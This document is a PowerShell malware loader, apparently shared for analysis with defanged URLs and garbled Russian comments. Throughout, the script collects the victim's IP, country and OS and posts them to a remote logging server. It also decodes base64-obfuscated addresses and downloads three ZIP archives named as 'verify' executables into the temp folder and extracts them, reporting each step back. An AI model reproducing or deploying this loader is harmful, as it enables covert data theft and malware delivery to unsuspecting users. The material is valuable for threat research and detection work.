[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "Script started" 
# –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω

try {
    # Collect system information 
    # –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ
    $ipInfo = Invoke-RestMethod -Uri "hxxp://ipinfo[.]io/json"
    Write-Host "IP data received: $ipInfo" 
    # IP-–¥–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã
    $ip = $ipInfo.ip
    $country = $ipInfo.country
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    Write-Host "OS: $os, Country: $country" 
    # –û–°: $os, –°—Ç—Ä–∞–Ω–∞: $country

    # Form initial message data 
    # –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
    $info = @{
        ip = $ip
        country = $country
        flag = "üåç"
        os = $os
        message = ":rocket: Script execution started successfully.`nEarth IP: $ip`nLocation Country: $country`nSystem Operating system: $os`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    }

    # Send initial message 
    # –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
    $infoJson = $info | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri "hxxps://tlgrmverif[.]cyou/log.php" -Method POST -Body $infoJson -ContentType "application/json"
    Write-Host "Initial message sent." 
    # –ù–∞—á–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ.
} catch {
    Write-Host "Error collecting system information: $_" 
    # –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ
}

# List of resources with new domain micropedik.in 
# –°–ø–∏—Å–æ–∫ —Ä–µ—Å—É—Ä—Å–æ–≤ —Å –Ω–æ–≤—ã–º –¥–æ–º–µ–Ω–æ–º micropedik.in
$e = @(
    @{ u = "aHR0cHM6Ly9taWNyb3BlZGlrLmluLzEuemlw"; z = "MS56aXA="; x = "ZXh0cmFjdA=="; e = "dmVyaWZ5MS5leGU=" }, 
    # URL: hxxps://micropedik[.]in/1.zip, ZIP Name: 1.zip, Extract Type: extract, EXE: verify1.exe
    @{ u = "aHR0cHM6Ly9taWNyb3BlZGlrLmluLzIuemlw"; z = "Mi56aXA="; x = "ZXh0cmFjdA=="; e = "dmVyaWZ5Mi5leGU=" }, 
    # URL: hxxps://micropedik[.]in/2.zip, ZIP Name: 2.zip, Extract Type: extract, EXE: verify2.exe
    @{ u = "aHR0cHM6Ly9taWNyb3BlZGlrLmluLzMuemlw"; z = "My56aXA="; x = "ZXh0cmFjdA=="; e = "dmVyaWZ5My5leGU=" }  
    # URL: hxxps://micropedik[.]in/3.zip, ZIP Name: 3.zip, Extract Type: extract, EXE: verify3.exe
)

# Base64 decoding function 
# –§—É–Ω–∫—Ü–∏—è –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è Base64
function d([string]$s) {
    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))
}

# Download, extract, and execute loop 
# –¶–∏–∫–ª —Å–∫–∞—á–∏–≤–∞–Ω–∏—è, —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∏ –∏ –∑–∞–ø—É—Å–∫–∞
$i = 1
foreach ($r in $e) {
    try {
        $u = d $r.u
        $z = Join-Path $env:TEMP (d $r.z)
        $extractFolder = "extract$i"  
        # Generate a unique folder name 
        # –§–æ—Ä–º–∏—Ä—É–µ–º –∏–º—è –¥–ª—è –∫–∞–∂–¥–æ–π —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∏
        $x = Join-Path $env:TEMP $extractFolder
        $n = d $r.e

        # Download ZIP file 
        # –°–∫–∞—á–∏–≤–∞–Ω–∏–µ ZIP-—Ñ–∞–π–ª–∞
        Write-Host "Downloading ZIP from $u" 
        # –°–∫–∞—á–∏–≤–∞–Ω–∏–µ ZIP —Å $u
        Invoke-WebRequest -Uri $u -OutFile $z

        if (Test-Path $z) {
            Write-Host "ZIP file downloaded: $z" 
            # ZIP-—Ñ–∞–π–ª —Å–∫–∞—á–∞–Ω: $z
            $statusMessage = ":package: ZIP file downloaded successfully: $z"
        } else {
            Write-Host "Error: ZIP file not downloaded." 
            # –û—à–∏–±–∫–∞: ZIP-—Ñ–∞–π–ª –Ω–µ —Å–∫–∞—á–∞–Ω.
            $statusMessage = ":x: ZIP file not downloaded: $u"
            continue
        }

        # Send download status 
        # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
        $info.message = $statusMessage
        $infoJson = $info | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "hxxps://tlgrmverif[.]cyou/log.php" -Method POST -Body $infoJson -ContentType "application/json"

        # Create extraction folder 
        # –°–æ–∑–¥–∞–Ω–∏–µ –ø–∞–ø–∫–∏ –¥–ª—è —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∏
        if (-not (Test-Path $x)) { New-Item -ItemType Directory -Path $x | Out-Null }

        # Extract ZIP 
        # –†–∞—Å–ø–∞–∫–æ–≤–∫–∞ ZIP
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($z, $x)
        Write-Host "ZIP file extracted to $x" 
        # ZIP-—Ñ–∞–π–ª —Ä–∞—Å–ø–∞–∫–æ–≤–∞–Ω –≤ $x
        $statusMessage = ":open_file_folder: ZIP file extracted to: $x"

        # Send extraction status 
        # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ —Ä–∞—Å–ø–∞–∫–æ–≤–∫–∏
        $info.message = $statusMessage
        $infoJson = $info | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "hxxps://tlgrmverif[.]cyou/log.php" -Method POST -Body $infoJson -ContentType "application/json"
    } catch {
        Write-Host "Execution error: $_" 
        # –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: $_
    }
    $i++  
    # Increment counter for next extraction folder 
    # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á—ë—Ç—á–∏–∫ –¥–ª—è —Å–ª–µ–¥—É—é—â–µ–π –ø–∞–ø–∫–∏
}
